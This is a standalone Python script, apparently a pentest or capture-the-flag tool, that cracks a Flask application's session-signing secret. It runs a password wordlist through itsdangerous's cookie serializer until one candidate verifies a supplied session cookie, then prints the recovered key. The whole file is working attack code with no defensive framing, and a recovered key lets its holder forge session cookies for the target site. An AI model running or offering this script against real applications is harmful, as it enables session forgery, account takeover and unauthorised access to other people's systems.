from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
import hashlib

##
##

# Load the cookie to test
cookie = ""

# Path to the wordlist file
wordlist_path = '/usr/share/wordlists/fasttrack.txt'

# Function to test a secret against the cookie
def test_secret(secret, cookie):
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret,
            salt='cookie-session',
            serializer=TaggedJSONSerializer(),
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
            }
        )
        # Attempt to decode the cookie
        serializer.loads(cookie)
        return True
    except BadSignature:
        return False

# Main logic to find the correct secret key
def find_secret_key(cookie, wordlist_path):
    try:
        with open(wordlist_path, 'r') as wordlist:
            for line in wordlist:
                secret = line.strip()  # Strip newlines and whitespace
                if test_secret(secret, cookie):
                    print(f"Key found: {secret}")
                    return secret
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist_path}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

    print("Key not found.")
    return None

# Call the function to find the secret key
if __name__ == "__main__":
    find_secret_key(cookie, wordlist_path)

##
##
